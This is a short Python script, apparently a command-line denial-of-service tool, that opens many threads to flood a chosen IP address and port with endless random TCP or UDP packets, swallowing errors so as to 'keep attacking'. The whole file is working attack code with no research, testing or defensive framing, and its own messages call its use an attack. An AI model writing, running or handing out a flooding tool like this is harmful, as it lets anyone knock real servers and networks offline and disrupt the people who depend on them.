import socket
import threading
import random
import time
import sys

def flood(target_ip, target_port, protocol, delay):
    try:
        if protocol == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            message = random._urandom(1024)
            while True:
                sock.send(message)
                time.sleep(delay)
        else:  # udp
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = random._urandom(1024)
            while True:
                sock.sendto(message, (target_ip, target_port))
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        sys.exit(0)
    except Exception:
        pass  # Ignore errors and keep attacking

def main():
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> <protocol tcp/udp> <threads> [delay_seconds]")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    protocol = sys.argv[3].lower()
    threads = int(sys.argv[4])
    delay = float(sys.argv[5]) if len(sys.argv) > 5 else 0

    if protocol not in ['tcp', 'udp']:
        print("Protocol must be 'tcp' or 'udp'")
        sys.exit(1)

    print(f"Starting {protocol.upper()} flood on {target_ip}:{target_port} with {threads} threads and {delay}s delay.")

    for _ in range(threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port, protocol, delay))
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped. Exiting program.")
        sys.exit(0)

if __name__ == "__main__":
    main()
